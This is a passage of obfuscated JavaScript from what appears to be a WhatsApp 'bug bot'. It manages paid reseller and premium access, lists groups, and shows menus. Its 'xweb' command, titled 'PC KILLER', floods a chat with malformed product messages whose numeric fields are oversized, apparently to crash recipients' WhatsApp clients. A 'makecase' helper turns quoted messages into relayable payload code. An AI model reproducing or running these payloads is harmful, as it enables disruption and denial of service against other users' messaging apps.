          if (!global.dev.includes(_0x220e22)) {
            return;
          }
          let _0x244be7 = _0xc6c87.replace(/[^0-9]/g, '');
          if (!_0x244be7) {
            return _0x7b48ae("Please provide a valid number.");
          }
          if (global.db.data.owners.includes(_0x244be7)) {
            return _0x7b48ae("Number already in reseller list.");
          }
          global.db.data.owners.push(_0x244be7);
          fs.writeFileSync("./database/database.json", JSON.stringify(global.db, null, 2));
          _0x7b48ae("Number " + _0x244be7 + " added to reseller.");
        }
        break;
      case "delresell":
      case "delreseller":
        {
          if (!global.dev.includes(_0x220e22)) {
            return;
          }
          let _0x2af010 = _0xc6c87.replace(/[^0-9]/g, '');
          if (!_0x2af010) {
            return _0x2d06fa.reply("Please provide a valid number to delete.");
          }
          let _0x365c1f = global.db.data.owners.indexOf(_0x2af010);
          if (_0x365c1f === -1) {
            return _0x7b48ae("The provided number is not in the reseller list.");
          }
          global.db.data.owners.splice(_0x365c1f, 1);
          fs.writeFileSync("./database/database.json", JSON.stringify(global.db, null, 2));
          _0x7b48ae("Number " + _0x2af010 + " has been removed from the reseller list.");
        }
        break;
      case "listresell":
      case "listreseller":
        {
          let _0x502064 = global.db.data.owners || [];
          if (_0x502064.length === 0) {
            return _0x7b48ae("There are no reseller in the list.");
          }
          let _0x49a18d = _0x502064.map((_0x2f095d, _0x5ef8fa) => _0x5ef8fa + 1 + ". " + _0x2f095d).join("\n");
          _0x7b48ae("Total Reseller: " + _0x502064.length + "\n\n" + _0x49a18d);
        }
        break;
      case "addprem":
      case "addpremium":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: t.me/rspxlegend1\nWhatsApp: +923176851874");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("*Incorrect use!*\n\nUsage:\n" + (_0x9f50af + _0x3baa40) + " <user|time>\n\nExample:\n" + (_0x9f50af + _0x3baa40) + " @0|1d");
          }
          let _0x291064 = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : _0xc6c87.split('|')[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (owner.includes(_0x291064)) {
            return _0x7b48ae("*Bot owners can't get owner!*");
          }
          let _0x172230 = await _0x5e59fa.isPremium(_0x3bc9a9, _0x291064);
          if (_0x172230) {
            return _0x7b48ae("*This user is already in the premium list*");
          }
          let _0x246c5e = await _0x2d3082.onWhatsApp(_0x291064);
          if (_0x246c5e.length < 1) {
            return _0x7b48ae("*Tag/reply/input number correctly!*\n\nUsage:\n" + (_0x9f50af + _0x3baa40) + " <user|time>\n\nExample:\n" + (_0x9f50af + _0x3baa40) + " @0|1d");
          }
          let _0x21d80a = _0xc6c87.split('|')[1];
          if (!_0x21d80a) {
            return _0x7b48ae("*Enter expiry date!*\n\nUsage:\n" + (_0x9f50af + _0x3baa40) + " <user|time>\n\nExample:\n" + (_0x9f50af + _0x3baa40) + " @0|1d");
          }
          await _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'react': {
              'text': '⏱️',
              'key': _0x2d06fa.key
            }
          });
          let _0x5d0f69 = await _0x5e59fa.addPrem(_0x3bc9a9, _0x246c5e[0].jid, _0x21d80a);
          const _0x1a6be9 = {
            'text': _0x5d0f69,
            'contextInfo': {
              'mentionedJid': _0x2d3082.ments(_0x5d0f69),
              'externalAdReply': {
                'title': "OWNER 💳",
                'previewType': "PHOTO",
                'thumbnailUrl': "https://pomf2.lain.la/f/dynqtljb.jpg",
                'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f"
              }
            }
          };
          return _0x2d3082.sendMessage(_0x2d06fa.chat, _0x1a6be9, {
            'quoted': _0x2d06fa
          });
        }
        break;
      case "delprem":
      case "delpremium":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: t.me/rspxlegend1\nWhatsApp: +923176851874");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("*Incorrect use!*\n\nUsage:\n" + (_0x9f50af + _0x3baa40) + " <user>\n\nExample:\n" + (_0x9f50af + _0x3baa40) + " @0");
          }
          let _0x456dfb = _0x2d06fa.mentionedJid[0] ? _0x2d06fa.mentionedJid[0] : _0x2d06fa.quoted ? _0x2d06fa.quoted.sender : _0xc6c87.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x55ee56 = await _0x5e59fa.isPremium(_0x3bc9a9, _0x456dfb);
          if (!_0x55ee56) {
            return _0x7b48ae("*This user is not a premium user!*");
          }
          let _0x77bc22 = await _0x5e59fa.delPrem(_0x3bc9a9, _0x456dfb);
          _0x7b48ae(_0x77bc22);
        }
        break;
      case "listprem":
      case "listpremium":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: t.me/rspxlegend1\nWhatsApp: +923176851874");
          }
          try {
            let _0x4544d8 = await _0x5e59fa.listPremium(_0x3bc9a9);
            let _0x1ebe65 = "*</> PREM USER LIST </>*\n\n";
            for (let _0x16fbf4 = 0; _0x16fbf4 < _0x4544d8.length; _0x16fbf4++) {
              let _0x439853 = _0x3bc9a9[_0x4544d8[_0x16fbf4]].premiumExpiry;
              if (!_0x439853 || _0x439853 <= Date.now()) {
                _0x1ebe65 += _0x16fbf4 + 1 + ". @" + _0x4544d8[_0x16fbf4].split('@')[0] + "\nExpired: Already expired\n\n";
                continue;
              }
              let _0x25ddd2 = _0x439853 - Date.now();
              let _0x27ea40 = Math.floor(_0x25ddd2 / 86400000);
              let _0x442649 = Math.floor(_0x25ddd2 % 86400000 / 3600000);
              let _0xa1aa08 = Math.floor(_0x25ddd2 % 3600000 / 60000);
              _0x1ebe65 += _0x16fbf4 + 1 + ". @" + _0x4544d8[_0x16fbf4].split('@')[0] + "\nExpire In: " + _0x27ea40 + " day, " + _0x442649 + " hour, " + _0xa1aa08 + " minute\n\n";
            }
            _0x2d3082.sendTextWithMentions(_0x2d06fa.chat, _0x1ebe65, _0x2d06fa);
          } catch (_0x46ce3a) {
            _0x7b48ae(util.format(_0x46ce3a), _0x3baa40);
          }
        }
        break;
      case "checkprem":
      case "checkpremium":
        {
          try {
            let _0x40cdbf = _0x3bc9a9[_0x2d06fa.sender].premiumExpiry;
            if (!_0x40cdbf || _0x40cdbf <= Date.now()) {
              return _0x7b48ae("Your owner subscription has already expired.");
            }
            let _0x512ca4 = _0x40cdbf - Date.now();
            let _0x463138 = Math.floor(_0x512ca4 / 86400000);
            let _0x15bd83 = Math.floor(_0x512ca4 % 86400000 / 3600000);
            let _0x340dcf = Math.floor(_0x512ca4 % 3600000 / 60000);
            let _0x4230a5 = "*</> PREM USER INFO </>*\n\n*Subscribe Info* :\n- User : @" + _0x2d06fa.sender.split('@')[0] + "\n- Duration : " + _0x463138 + "D\n- Expire In : \n" + _0x463138 + " day, " + _0x15bd83 + " hour, " + _0x340dcf + " minute\n\n*Benefit Info* :\n- Premium Access : Yes\n- User Priority : Yes\n";
            const _0x105e78 = {
              'text': _0x4230a5,
              'contextInfo': {
                'mentionedJid': _0x2d3082.ments(_0x4230a5),
                'externalAdReply': {
                  'title': "PREMIUM 💳",
                  'previewType': "PHOTO",
                  'thumbnailUrl': "https://pomf2.lain.la/f/dynqtljb.jpg",
                  'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f"
                }
              }
            };
            return _0x2d3082.sendMessage(_0x2d06fa.chat, _0x105e78, {
              'quoted': _0x2d06fa
            });
          } catch (_0x15ecac) {
            await _0x7b48ae(util.format(_0x15ecac), _0x3baa40);
          }
        }
        break;
      case "self":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: t.me/rspxlegend\nWhatsApp: +923176851874");
          }
          _0x2d3082["public"] = false;
          _0x7b48ae("Success Change To Self Mode");
        }
        break;
      case "public":
        {
          if (!(global.db.data.owners || []).includes(_0x220e22)) {
            return _0x7b48ae("❌ Sorry you don't have permission to use this command. This command can only be used by reseller! \n\nWant to buy reseller? Chat Developer!\nYouTube: https://youtube.com/@rsp_editz74\nTelegram: t.me/rspxlegend1\nWhatsApp: +923176851874");
          }
          _0x2d3082["public"] = true;
          _0x7b48ae("Success Change To Public Mode");
        }
        break;
      case "listgc":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          let _0x5ca126 = await _0x2d3082.groupFetchAllParticipating();
          let _0x2cc507 = Object.entries(_0x5ca126).slice(0).map(_0x49599c => _0x49599c[1]);
          let _0x3ba3d1 = _0x2cc507.map(_0x134223 => _0x134223.id);
          let _0x29f659 = 0;
          let _0x52c046 = "⬣ *LIST OF GROUP BELOW*\n\nTotal Group : " + _0x3ba3d1.length + " Group\n\n";
          for (let _0x5ed92a of _0x3ba3d1) {
            let _0x29e62d = await _0x2d3082.groupMetadata(_0x5ed92a);
            _0x52c046 += "❏ Group " + (_0x29f659 += 1) + "\n│⭔ *Name :* " + _0x29e62d.subject + "\n│⭔ *ID :* " + _0x29e62d.id + "\n│⭔ *MEMBER :* " + _0x29e62d.participants.length + "\n╰────|\n\n";
          }
          _0x2d06fa.reply(_0x52c046);
        }
        break;
      case "owner":
        {
          const _0x446a76 = '' + ownernomer;
          const _0x2b3f04 = {
            'displayName': _0x446a76,
          };
          const _0x1c7cfe = await _0x2d3082.sendMessage(_0x401194, {
            'contacts': {
              'contacts': [_0x2b3f04]
            },
            'contextInfo': {
              'forwardingScore': 0x3e7,
              'isForwarded': false,
              'mentionedJid': [_0x1de310],
              'externalAdReply': {
                'showAdAttribution': true,
                'renderLargerThumbnail': true,
                'title': "Best WhatsApp Bot 💻",
                'containsAutoReply': true,
                'mediaType': 0x1,
                'jpegThumbnail': fs.readFileSync("./RSPMedia/RSP.jpg"),
                'mediaUrl': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg",
                'sourceUrl': "https://youtube.com/@rsp_editz74"
              }
            }
          }, {
            'quoted': _0x2d06fa
          });
          await _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'audio': fs.readFileSync("./RSPMedia/sikma.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x1c7cfe
          });
        }
        break;
      case "xweb":
        try {
          for (let _0x5a9846 = 0; _0x5a9846 < 10; _0x5a9846++) {
            messa = await prepareWAMessageMedia({
              'image': {
                'url': "https://pic.re/image"
              }
            }, {
              'upload': _0x2d3082.waUploadToServer
            });
            catalog = generateWAMessageFromContent(_0x401194, proto.Message.fromObject({
              'productMessage': {
                'product': {
                  'productImage': messa.imageMessage,
                  'productId': "449756950375071",
                  'itemCount': 0x174876e7ff,
                  'title': "PC KILLER X Telegram: RSPxLegendOP",
                  'description': '',
                  'currencyCodeIso4217': "IDR",
                  'footerText': '',
                  'productImageCount': 0x56bc75e2d63100000,
                  'firstImageId': 0x2540be3ff,
                  'priceAmount1000': "999",
                  'salePriceAmount1000': "IDR 99.99999999999999999999",
                  'thumbnail': messa.imageMessage,
                  'jpegThumbnail': _0x2d06fa,
                  'firstImageId': 0x5f5e0ff,
                  'url': "wa.me/5512981791389"
                },
                'businessOwnerJid': _0x401194
              }
            }), {
              'userJid': _0x2d3082.user.id,
              'quoted': null
            });
            _0x2d3082.relayMessage(_0x401194, catalog.message, {
              'messageId': catalog.key.id
            });
          }
        } catch (_0x3fb070) {
          console.log(_0x3fb070);
        }
        break;
      case "ping":
      case "runtime":
      case 'p':
      case "botstatus":
      case "statusbot":
        {
          const _0x3e7b3e = require("performance-now");
          const {
            performance: _0x484e8b
          } = require("perf_hooks");
          let _0x290a28 = _0x3e7b3e();
          let _0x7dc644 = _0x3e7b3e() - _0x290a28;
          neww = _0x484e8b.now();
          oldd = _0x484e8b.now();
          respon = ("\n𝐵𝑂𝑇 𝑆𝑃𝐸𝐸𝐷 🚀: " + _0x7dc644.toFixed(4) + "M⃟S ⚡").trim();
          _0x7b48ae(respon);
        }
        break;
      case "makecase":
        if (!_0x2d06fa.quoted) {
          return _0x7b48ae("Reply to a message to make a case of it!");
        }
        кибар = q.split(" ")[0];
        if (!кибар) {
          return _0x7b48ae("Example Usage: " + (_0x9f50af + _0x3baa40) + " abc");
        }
        const _0x3ad4b5 = JSON.stringify(_0x2d06fa.message.extendedTextMessage.contextInfo.quotedMessage, null, 2);
        _0x7b48ae("case '" + кибар + "': \nif (!isBot && !isCreator) return\ntry {\nvar " + кибар + " = generateWAMessageFromContent(from, proto.Message.fromObject(" + _0x3ad4b5 + "),{ userJid: from })\nXeonBotInc.relayMessage(from, " + кибар + ".message, {messageId: " + кибар + ".key.id })\n} catch (e) {\nconsole.log(e)\n}\nbreak");
        break;
      case "tesb":
        {
          let _0x24e360 = generateWAMessageFromContent(_0x2d06fa.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': "hui"
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "Best WhatsApp Bot 💻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': fs.readFileSync("./RSPMedia/donate.jpg")
                    }, {
                      'upload': _0x2d3082.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "cta_call",
                      'buttonParamsJson': JSON.stringify({
                        'display_text': "Call Owner",
                        'phone_number': "+1234567890"
                      })
                    }]
                  }),
                  'contextInfo': {
                    'mentionedJid': [_0x2d06fa.sender],
                    'forwardingScore': 0x3e7,
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': idch,
                      'newsletterName': "Join RSP Channel 🔥",
                      'serverMessageId': 0x8f
                    }
                  }
                })
              }
            }
          }, {
            'quoted': _0x2d06fa
          });
          return await _0x2d3082.relayMessage(_0x2d06fa.chat, _0x24e360.message, {});
        }
        break;
      case "tesmen":
      case "backtomenu":
        {
          caption = "tes";
          const _0x28a8c3 = [{
            'buttonId': ".menu",
            'buttonText': {
              'displayText': "Xeon"
            }
          }, {
            'buttonId': "xownermenu",
            'buttonText': {
              'displayText': "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
            }
          }, {
            'buttonId': "tapmenu",
            'buttonText': {
              'displayText': "𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞"
            }
          }];
          const _0x282f2d = [{
            'buttonId': "singleSelect",
            'buttonText': {
              'displayText': "𝐒𝐢𝐧𝐠𝐥𝐞 𝐒𝐞𝐥𝐞𝐜𝐭"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "Select an Option",
                'sections': [{
                  'title': "Main Options",
                  'rows': [{
                    'title': "Credits And Special Thanks",
                    'description': " ",
                    'id': "credits"
                  }, {
                    'title': "Option 2",
                    'description': "Description for Option 2",
                    'id': "ping"
                  }]
                }]
              })
            }
          }];
          _0x28a8c3.push(..._0x282f2d);
          _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'image': {
              'url': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg"
            },
            'caption': caption,
            'mentions': [_0x2d06fa.sender],
            'footer': global.botname,
            'buttons': _0x28a8c3,
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x2d06fa,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "0029VbB5fdg9xVJnrkIIVg3f@newsletter",
                'newsletterName': 'ok'
              }
            }
          }, {
            'quoted': _0x2d06fa
          });
        }
        break;
      case "getmtype":
        {
          if (!_0x2d06fa.quoted) {
            return _0x7b48ae("Reply to a message to debug its mtype!");
          }
          const _0x395860 = _0x2d06fa.quoted.mtype || "Unknown";
          console.log("Quoted Message Type: " + _0x395860);
          await _0x7b48ae("Quoted Message Type: " + _0x395860);
        }
        break;
      default:
    }
  } catch (_0x4be1ff) {
    console.log(util.format(_0x4be1ff));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("Update " + __filename);
  delete require.cache[file];
  require(file);
});